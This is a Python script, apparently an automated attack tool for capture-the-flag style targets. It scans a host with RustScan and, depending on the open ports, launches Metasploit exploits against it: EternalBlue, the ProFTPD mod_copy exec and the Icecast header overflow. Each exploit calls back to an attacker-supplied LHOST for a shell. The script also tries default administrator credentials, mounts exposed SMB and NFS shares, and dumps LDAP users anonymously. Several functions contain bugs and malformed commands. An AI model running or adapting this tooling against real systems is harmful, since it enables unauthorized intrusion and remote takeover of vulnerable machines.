import os
import argparse
import sys
from colorama import Fore
from pathlib import Path 

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET
                                                                                                                                                                        
parser = argparse.ArgumentParser(description="Eternal Blue",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="Eternal Blue", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
parser.add_argument("-p", "--LPORT", action="store", help="LPORT")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
parser.add_argument("-D", "--DOWNLOAD", action="store_true", help="Download Tools")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
LPORT = args.LPORT
LHOST = args.LHOST
DOMAIN = args.DOMAIN
DOWNLOAD = args.DOWNLOAD

def DOWN():
	content = ("/usr/bin/rustscan")
	if (os.path.isfile(content) == True):
	   	print(f"{BLUE}RustScan Installed{RESET}")
	if (os.path.isfile(content) != True):
	   	print(f"{RED}RustScan not installed, installing{RESET}")
	   	URL="https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" 
	   	os.system(f"wget -c --read-timeout=5 --tries=0 {URL}")
	   	os.system("sudo dpkg -i rustscan_2.0.1_amd64.deb")

def RustScan():
	path="ports.txt"
	if (os.path.isfile(path) != True):
		print(f"{MAGENTA}Running RustScan{RESET}")
		os.system(f"rustscan -u 5000 -a {RHOST} -- -Pn > ports.txt")
		print(f"{GREEN}Done running scan{RESET}")

def BLUE():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="445/tcp"
		if word in content:
			print(f"{MAGENTA}SMB is running, checking if it is vulnerable to anything with nmap scripts{RESET}")
			os.system(f"nmap -p 445 --script=smb-vuln* -Pn {RHOST} > blue.txt")
			with open ("blue.txt", "r") as f:
				content = f.read()
				word = "CVE:CVE-2017-0143"
				if word in content:
					print(f"{RED}Vulnerable to Eternal Blue{RESET}")
					os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set rhost {RHOST}; set lhost {LHOST}; set LPORT {LPORT}; run'")
def SMB():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="445/tcp"
		if word in content:
			os.system(f"smbclient -L \\\\\\\\{RHOST}\\\\")
			print(f"{MAGENTA}Attempting to mount SMB share{RESET}")
			smb = input("Would you like to mount SMB (s) share, or open with SMBCLIENT (c) (s/c): \n")
			print(f"{MAGENTA}Mounting SMB Server to folder smb{RESET}")
			try:
			   os.mkdir("smb")
			except FileExistsError:
   			# directory already exists
   				pass
			if smb == "c":
				print(f"{MAGENTA}Not mounting SMB Server to folder smb{RESET}")
				share = input("SMB share name to mount: \n")
				os.system(f"smbclient \\\\\\\\{RHOST}\\\\{share}")
			if smb == "s":
				share = input("SMB share name to mount: \n")
				os.system(f"sudo mount -t cifs //{RHOST}/{share} smb -o user=,password=")
				print(f"{BLUE}SMB Share has been mounted{RESET}")

def FTP():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="21/tcp"
		if word in content:
			print(f"{MAGENTA}FTP Running, trying some differnet things{RESET}")
			os.system(f"nmap -p 21 -sC -sV {RHOST} >> ports.txt")
			with open ("ports.txt", "r") as f:
				content = f.read()
				word = "ProFTPD 1.3.5"
				if word in content:
					print(f"{RED}PROFTPD 1.3.5 Running, exploiting now{RESET}")
					os.system(f"msfconsole -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set lhost {LHOST}; set rhost {RHOST}; set lport {LPORT}; run'")

def MOUNT():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="2049/tcp"
		if word in content:
			print(f"{MAGENTA}Mount Running{RESET}")
			os.system(f"showmount -e {RHOST}")
			mount = input(f"Mount point running on {RHOST}: \n")
			try:
				os.mkdir("mount")
			except FileExistsError:
   				# directory already exists
   				pass
			os.system(f"sudo mount -t nfs {RHOST}:{mount} mount")

def ICE():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="8000/tcp"
		if word in content:
			print(f"{MAGENTA}Webserver on port 8000 running, checking service{RESET}")
			os.system(f"nmap -p 8000 -sC -sV {RHOST} -Pn > http.txt")
			path="http.txt"
			with open (path, "r") as f:
				content = f.read()
				word="Icecast streaming media server"
		if word in content:
			print(f"{BLUE}Icecast is running, trying to exploit{RESET}")
			os.system(f"msfconsole -x 'use exploit/windows/http/icecast_header; set lhost {LHOST}; set rhost {RHOST}; set rport 8000; set lport {LPORT}; run'")

def DOM():
	if DOMAIN == None:
		path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="88/tcp"
		if word in content:
			print(f"{GREEN}Getting Domain Name for {RHOST}{RESET}")
			os.system(f"crackmapexec smb {RHOST} -u administrator -p administrator | tail -n 1 | cut -d ']' -f 2 | cut -d '\\' -f 1 | tr -d \" \\t\\n\\r\" | sed -e 's/\x1b\[[0-9;]*m//g'  > domainname.txt")
			with open ("domainname.txt", "r") as f:
				content = f.read()
				print(f"{GREEN}Domain name is {BLUE}{content}{RESET}")

def LDAPSEARCH():
	path="ports.txt"
	with open (path, "r") as f:
		content = f.read()
		word="636/tcp"
	if word in content:
		print(f"LDAP Running")
		os.system(f"crackmapexec smb {RHOST} -u fdjakf -p fdafjklf | tail -n 1 | cut -d ']' -f 2 | cut -d '\' -f 1 | tr -d \ \" \\t\\n\\r\\\" | sed -e 's/\x1b\[[0-9;]*m//g' > domainname.txt")
		os.system(f"cat domainname.txt | cut -d '.' -f 1 > dom1.txt")
		os.system(f"cat domainname.txt | cut -d '.' -f 2 > dom2.txt")
		print(f"{RED}May have to run multiple times depending on VPN connection speed{RESET}")
		with open ("dom1.txt", "r") as f:
			x = f.read()
			print(x)
		with open ("dom2.txt", "r") as f:
			y = f.read()
			print(y)
		print(f"{MAGENTA}Trying Anonymous LDAP Login and saving any output to ldap.txt{RESET}")
		os.system(f"ldapsearch -H ldap://{RHOST} -x -b \"DC={x},DC={y}\" '(objectclass=person)' > ldap.txt")
		os.remove("dom1.txt")
		os.remove("dom2.txt")
		os.system("cat ldap.txt | grep -i samaccountname > users.txt")
		os.system("cat ldap.txt | grep -i description > description.txt")

if DOWNLOAD == True:
	DOWN()
if RHOST is not False:
	RustScan()
	DOM()
	BLUE()
	LDAPSEARCH()
	MOUNT()
	SMB()
	ICE()
	FTP()
